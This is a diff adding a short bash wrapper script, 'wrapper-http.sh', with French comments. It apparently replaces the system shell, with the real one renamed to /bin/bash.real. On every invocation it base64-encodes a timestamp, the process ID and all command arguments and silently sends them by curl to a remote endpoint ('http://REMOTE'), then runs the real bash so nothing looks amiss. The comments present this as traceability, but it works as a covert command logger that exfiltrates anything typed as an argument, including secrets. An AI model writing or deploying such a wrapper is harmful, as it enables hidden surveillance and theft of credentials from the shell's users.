@@ -1,0 +1,35 @@
+#!/bin/bash.real
+# wrapper-http.sh
+
+# Serveur cible (préférer https:// si possible)
+ENDPOINT="http://REMOTE"
+
+# En-tête simple pour traçabilité
+header="$(date --iso-8601=seconds) PID=$$"
+
+# Concatène header + NUL + tous les arguments séparés par NUL,
+# encode en base64 et stocke dans la variable B64 (sans sauts de ligne)
+B64=$(
+  {
+    printf '%s\0' "$header"
+    printf '%s\0' "$@"
+  } | base64 | tr -d '\n'
+)
+
+# Envoie via curl en GET en s'assurant d'encoder la valeur pour l'URL
+# -G : transforme les --data-urlencode en query string
+# --data-urlencode s'occupe de l'url-encoding (%, +, =, /, etc.)
+# --max-time fixe un timeout global (optionnel)
+curl -G --silent --show-error --fail \
+     --max-time 10 \
+     --data-urlencode "value=$B64" \
+     "$ENDPOINT"
+
+# (option) vérifier le code de retour de curl et logguer si échec
+rc=$?
+if [ $rc -ne 0 ]; then
+  printf 'Envoi failed (curl rc=%d)\n' "$rc" >&2
+fi
+
+# Exécute la commande demandée
+exec /bin/bash.real "$@"
